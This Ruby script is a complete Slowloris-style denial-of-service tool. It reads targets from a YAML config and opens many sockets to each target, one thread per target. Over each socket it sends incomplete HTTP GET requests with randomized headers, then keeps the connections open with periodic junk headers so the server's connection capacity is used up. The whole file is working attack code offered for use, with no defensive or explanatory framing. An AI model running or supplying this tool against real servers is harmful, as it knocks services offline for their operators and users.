#!/usr/bin/ruby

require 'securerandom'
require 'socket'
require 'thread'
require 'yaml'

require_relative 'argparser'
require_relative 'target'


##
# Create an initial socket connection to the target.
# Sends incomplete GET request and randomized headers.
#
# Parameters:
#   config    (Hash):     configuration.
#   hostname  (String):   FDQN or IP address of the target.
#   port      (Integer):  network port number to attack.
#
# Returns: Socket
#
def connect config, target
  s = TCPSocket.open target.hostname, target.port
  s.write "GET /?#{SecureRandom.rand(1...5000)} HTTP/1.1\r\n"
  s.write "User-agent: #{config['user_agents'].sample}\r\n"
  s.write "Accept-language: #{config['languages'].sample}\r\n"
  s
rescue Errno::EMFILE, Errno::ECONNREFUSED
  # Do nothing, keep going.
rescue SocketError
  puts 'Target unreachable.'
  exit
end
  
##
# Starts the attack, creating multiple sockets and keeping them alive.
# If a connection is dropped another one will be created.
#
# Parameters:
#   hostname  (String):   FDQN or IP of the target.
#   port      (Integer):  network port number to attack.
#
def run_attack config, target
  puts 'Running attack...'
  loop do
    (config['env']['num_conxs'] - target.socket_count).times { target.sockets << connect(config, target) }
    target.sockets.each do | s |
      begin
        s.write "X-a: #{SecureRandom.rand(1...5000)}\r\n"
      rescue
        target.sockets.delete s
      end
    end
    
    puts target if config['env']['verbose']
    sleep config['env']['stall']
  end
end

##
# Main driver.
# Parses configuration file and launches attack - one thread per target.
#
def main
  begin
    config_filename = File.expand_path File.dirname(__FILE__) + '/config.yml'
    config = YAML.load(File.read(config_filename))
  rescue Errno::ENOENT
    puts "Config file not found: '#{config_filename}'"
    exit 1
  end

  options = nil
  begin
    config = ArgParser.parse_args(config, ARGV)
  rescue => e
    puts e.message
    exit 1
  end
  
  if not config['targets']
    puts 'No target(s) specified. See configuration file.'
    exit 1
  end
  
  puts 'Initiating attack...'
  threads = Array.new
  config['targets'].each { | target |  
    threads << Thread.new { run_attack config, Target.new(target['hostname'], target['port']) } 
  }
  threads.each(&:join)
end

main
